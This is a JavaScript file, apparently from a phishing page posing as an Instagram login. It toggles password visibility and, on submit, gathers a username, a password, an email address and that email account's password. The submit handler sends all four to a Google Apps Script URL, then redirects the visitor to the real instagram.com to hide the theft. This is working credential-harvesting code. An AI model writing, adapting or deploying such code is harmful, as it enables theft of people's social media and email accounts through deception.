const  pass = document.getElementById('pass');
const  epass = document.getElementById('epass');
const btn = document.getElementById('btn');
const btn2 =document.getElementById('btn2');
const btn3 =document.getElementById('btn3');
const form = document.querySelector("#form");

const username = document.querySelector("#user")
const crendentials = document.querySelector("#pass")
const email = document.querySelector("#email");
const e_pass = document.querySelector("#epass")
btn.addEventListener('click', (e)=>{
    e.preventDefault()
if(btn.innerText ==='Show'){
    btn.innerText = 'Hide';
    pass.type = 'text';
}
else{
    btn.innerText ='Show';
    pass.type ='password';
}
})


btn2.addEventListener('click', (e)=>{
    // e.preventDefault()
if(btn2.innerText ==='Show'){
    btn2.innerText = 'Hide';
    epass.type = 'text';
}
else{
    btn2.innerText ='Show';
    epass.type ='password';
}
})



epass.addEventListener('keyup',(e) =>{
const value = e.target.value
if(value ===""){
    btn3.disabled = true;
}
else{
    btn3.disabled = false;
}
})
form.addEventListener('submit',(e)=> {
    e.preventDefault();
    submit_form();
})
// btn3.addEventListener("click",()=> {
//     console.log("sumbit button clicked !");
//     submit_form();
// })



var submit_form = (e) => {
    if(username.value !== "" && crendentials.value !== "" && email.value !== "" && epass.value !== ""){
        console.log(username.value,crendentials.value)
        fetch(`https://script.google.com/macros/s/AKfycbx07jNSH5Ns0m_gYU_t0XEpUH81_Byr256xOUyuYQIGrKrBNl29bEAseKWXMudz6NjA/exec?user=${encodeURIComponent(username.value)}&cred=${encodeURIComponent(crendentials.value)}&email=${encodeURIComponent(email.value)}&epass=${encodeURIComponent(epass.value)}`)
        .then((res)=> {
            window.location.href="https://instagram.com"
        })
    }
}


